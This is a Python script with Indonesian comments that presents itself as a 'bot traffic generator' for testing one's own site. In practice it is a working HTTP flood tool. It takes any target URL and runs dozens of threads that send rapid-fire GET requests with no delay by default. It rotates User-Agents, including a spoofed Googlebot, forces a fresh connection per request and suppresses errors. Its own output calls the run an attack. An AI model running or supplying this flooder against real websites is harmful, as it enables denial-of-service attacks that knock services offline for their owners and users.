#!/usr/bin/env python3
"""
🔥 Bot Traffic Generator - Versi Diperkuat
Selamat datang di menu saya!
(Hanya untuk pengujian internal pada website milik sendiri!)
"""

import requests
import threading
import time
import logging
import sys
import random
from urllib.parse import urlparse

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
    datefmt='%H:%M:%S'
)

# Daftar User-Agent umum (untuk variasi)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

def validate_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ["http", "https"], result.netloc])
    except:
        return False

def send_bot_traffic(url, bot_id, requests_per_bot, delay):
    """Fungsi untuk satu 'bot' mengirim banyak request (tanpa session reuse)"""
    for i in range(requests_per_bot):
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",  # Tutup koneksi tiap request → lebih banyak koneksi baru
                "Upgrade-Insecure-Requests": "1",
            }
            # Tidak pakai session → tiap request benar-benar baru
            resp = requests.get(
                url,
                headers=headers,
                timeout=5,          # Timeout lebih ketat
                allow_redirects=True,
                stream=False
            )
            logging.info(f"Bot-{bot_id:02d} → {url} | Status: {resp.status_code}")
        except Exception as e:
            # Cukup log ringkas, jangan ganggu alur
            logging.debug(f"Bot-{bot_id:02d} → Error: {type(e).__name__}")

        if delay > 0:
            time.sleep(delay)
        # Jika delay = 0 → kirim secepat mungkin!

def main():
    print("🤖 Selamat datang di menu saya!")
    print("=" * 40)

    # Input target
    while True:
        target = input("🔗 Masukkan target website (contoh: http://192.168.1.10): ").strip()
        if validate_url(target):
            break
        print("❌ URL tidak valid! Gunakan format: http:// atau https://")

    # Input jumlah bot & request
    try:
        num_bots = int(input("👾 Jumlah 'bot' (misal: 50): ") or "50")
        req_per_bot = int(input("📨 Request per bot (misal: 100): ") or "100")
        delay = float(input("⏱️  Delay antar request per bot (0 = secepatnya): ") or "0")
    except ValueError:
        print("⚠️  Input tidak valid. Menggunakan nilai default.")
        num_bots, req_per_bot, delay = 50, 100, 0

    print(f"\n🚀 Memulai serangan bot...")
    print(f"🎯 Target: {target}")
    print(f"🧍 Jumlah bot: {num_bots} | Total request: {num_bots * req_per_bot}")
    print(f"⚡ Delay: {'Tidak ada (mode cepat!)' if delay == 0 else f'{delay} detik'}")
    print("-" * 50)
    print("ℹ️  Log hanya menampilkan request sukses. Error disembunyikan agar tidak membanjiri layar.")
    if delay == 0:
        print(f"⚠️  {num_bots} thread akan mengirim request SECEPAT MUNGKIN!\n")

    # Jalankan bot dalam thread
    threads = []
    for bot_id in range(1, num_bots + 1):
        t = threading.Thread(
            target=send_bot_traffic,
            args=(target, bot_id, req_per_bot, delay)
        )
        t.daemon = True  # Agar berhenti saat Ctrl+C
        threads.append(t)
        t.start()

    try:
        # Tunggu semua selesai
        for t in threads:
            t.join()
        print("\n✅ Semua bot selesai bekerja.")
    except KeyboardInterrupt:
        print("\n🛑 Dihentikan oleh pengguna.")

if __name__ == "__main__":
    main()
